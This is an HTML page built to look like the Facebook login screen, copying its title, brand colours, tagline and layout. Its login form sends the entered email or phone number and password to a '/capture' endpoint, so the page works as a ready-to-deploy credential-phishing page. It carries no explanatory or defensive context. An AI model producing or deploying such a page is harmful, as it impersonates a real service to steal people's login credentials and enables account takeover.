<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Facebook - log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;
display:flex;flex-direction:column;align-items:center;justify-content:center}
.wrap{display:flex;align-items:center;gap:40px;max-width:980px;padding:20px}
.left{flex:1;max-width:500px}
.left h1{color:#1877f2;font-size:3rem;font-weight:700;margin-bottom:12px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
.left p{font-size:1.2rem;color:#1c1e21;line-height:1.4}
.right{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);
padding:20px;width:396px}
.right input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;
border-radius:6px;margin-bottom:12px;outline:none;color:#1d2129}
.right input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.right input::placeholder{color:#90949c}
.btn-login{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;
border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.btn-login:hover{background:#166fe5}
.forgot{text-align:center;display:block;color:#1877f2;font-size:14px;text-decoration:none;margin-bottom:20px}
.divider{border-top:1px solid #dadde1;margin:16px 0}
.btn-new{display:block;margin:0 auto;padding:12px 24px;background:#42b72a;color:#fff;
border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.btn-new:hover{background:#36a420}
.footer{text-align:center;font-size:12px;color:#737373;margin-top:28px;max-width:980px;line-height:1.8}
@media(max-width:900px){.wrap{flex-direction:column;text-align:center}.left{max-width:100%}
.left h1{font-size:2rem}.right{width:100%;max-width:396px}}
</style>
</head>
<body>
<div class="wrap">
<div class="left">
<h1>facebook</h1>
<p data-i18n="tagline">Facebook helps you connect and share with the people in your life.</p>
</div>
<div class="right">
<form method="POST" action="/capture">
<input type="text" name="username" data-i18n-ph="email_ph" placeholder="Email address or phone number" required autocomplete="off">
<input type="password" name="password" data-i18n-ph="pass_ph" placeholder="Password" required>
<button type="submit" class="btn-login" data-i18n="login">Log in</button>
<a href="#" class="forgot" data-i18n="forgot">Forgotten password?</a>
<div class="divider"></div>
<button type="button" class="btn-new" data-i18n="create">Create new account</button>
</form>
</div>
</div>
